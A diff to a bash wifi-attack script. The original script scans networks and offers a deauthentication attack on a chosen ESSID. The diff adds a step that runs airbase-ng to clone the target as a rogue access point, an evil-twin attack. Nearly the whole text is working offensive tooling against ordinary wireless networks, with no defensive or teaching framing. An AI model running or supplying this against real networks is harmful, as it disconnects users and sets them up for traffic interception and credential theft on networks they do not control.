@@ -6,7 +6,7 @@ read essid
 clear
 array=( $(sudo iwlist wlp4s0 scan | grep "Address\|Channel:\|ESSID:" | grep -B 2 "${essid}") )
 count=0
-echo "Do you want to DEAUTH attack ${essid} Yes/No ?"
+echo "Do you want to DEAUTH and CLONE attack ${essid} Yes/No ?"
 read response
 if [ $response = Yes ]
 then
@@ -29,4 +29,12 @@ then
 		fi
 		((++count))
 	done
+	echo "Deauth done, creating clone"
+	sudo airbase-ng --essid ${essid} wlxf81a6709dba3mon
+	#sudo airbase-ng -a ${bssid} --essid ${essid} -c ${channel} wlxf81a6709dba3mon
+	#need to read the bssid and the channel in this case (for more precision)
+	echo "Clone created"
 fi
+
+
+
